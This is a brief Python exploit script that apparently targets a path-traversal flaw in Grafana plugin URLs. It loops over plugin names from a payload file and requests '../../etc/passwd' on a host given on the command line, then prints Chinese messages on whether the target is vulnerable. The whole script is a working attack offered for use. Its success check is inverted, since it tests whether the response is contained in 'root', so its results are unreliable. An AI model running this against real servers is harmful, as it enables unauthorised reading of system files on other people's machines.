# coding=utf-8
# author:Big&Bird

import requests
import sys

args = str(sys.argv[1])
f = open("payload.txt")
for line in f:
    url = "http://"+args+"/public/plugins/"+line.rstrip()+"/../../../../../../../../etc/passwd"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62"
    }
    req = requests.post(url,headers=headers,timeout=(3,7),allow_redirects=False)
    a=req.text
    str1='root'
    if a in str1:
        print('确认存在'+line.rstrip()+'路径，并存在漏洞')
        print(url)
    else:
        print('不存在漏洞')

